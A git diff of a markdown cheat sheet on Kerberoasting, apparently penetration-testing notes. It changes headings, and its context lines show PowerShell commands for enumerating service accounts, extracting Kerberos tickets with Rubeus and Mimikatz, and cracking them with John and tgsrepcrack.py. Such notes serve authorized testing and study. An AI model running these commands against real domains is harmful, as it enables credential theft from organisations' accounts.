@@ -12,7 +12,7 @@ C:> Get-DomainUser -SPN
 # Using AD Module
 C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
 ```
-##### Using `Rubeus.exe`
+#### Using `Rubeus.exe`
 ```powershell
 # Get kerberos stats
 C:> Rubeus.exe /stats
@@ -30,7 +30,7 @@ C:> Rubeus.exe kerberoast /outfile:hashes.txt
 # Crack with John
 C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 ```
-##### Using Mimikatz
+#### Using Mimikatz
 ```powershell
 C:> Add-Type -AssemblyNAme System.IdentityModel
 
@@ -43,3 +43,5 @@ C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
 # Crack using `tgsrepcrack.py`
 C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>.kirbi
 ```
+### Targeted Kerberoasting AS-REPs
+---
